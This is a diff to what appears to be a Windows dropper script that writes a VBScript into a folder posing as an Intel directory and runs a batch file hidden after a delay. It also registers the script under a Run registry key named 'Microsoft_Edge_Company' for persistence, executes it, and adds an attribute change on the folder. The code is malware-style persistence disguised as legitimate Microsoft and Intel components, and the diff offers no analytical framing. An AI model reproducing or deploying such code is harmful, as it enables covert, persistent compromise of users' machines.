@@ -7,5 +7,7 @@ goto a
 WScript.Sleep 10000
 set objshell = createobject("wscript.shell")
 objshell.run "C:\Intel\Profiles/IE/IEX\MSDLSIM.bat",vbhide
-"@; add-content "C:\Intel\Profiles/IE/IEX/MSDLSIM.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles/IE/IEX/MSDLSIM.vbs; cd C:\Intel\Profiles/IE/IEX; ./MSDLSIM.vbs
+"@; add-content "C:\Intel\Profiles/IE/IEX/MSDLSIM.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles\IE\IEX\MSDLSIM.vbs; cd C:\Intel\Profiles\IE\IEX; ./MSDLSIM.vbs
+cd C:\
+attrib -s -r -h -a intel
 exit
